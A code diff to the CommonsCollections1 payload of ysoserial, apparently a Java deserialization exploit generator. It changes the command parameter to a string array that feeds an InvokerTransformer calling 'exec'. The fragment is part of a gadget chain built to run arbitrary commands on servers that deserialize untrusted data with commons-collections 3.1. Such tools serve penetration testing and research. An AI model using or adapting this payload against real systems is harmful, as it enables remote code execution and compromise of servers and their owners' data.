@@ -41,8 +41,7 @@ import ysoserial.payloads.util.Reflections;
 @Dependencies({"commons-collections:commons-collections:3.1"})
 public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
 	
-	public InvocationHandler getObject(final String command) throws Exception {
-		final String[] execArgs = new String[] { command };
+	public InvocationHandler getObject(final String[] command) throws Exception {
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
 			new Transformer[]{ new ConstantTransformer(1) });
@@ -56,7 +55,7 @@ public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<
 					Object.class, Object[].class }, new Object[] {
 					null, new Object[0] }),
 				new InvokerTransformer("exec",
-					new Class[] { String.class }, execArgs),
+					new Class[] { String.class }, command),
 				new ConstantTransformer(1) };
 
 		final Map innerMap = new HashMap();
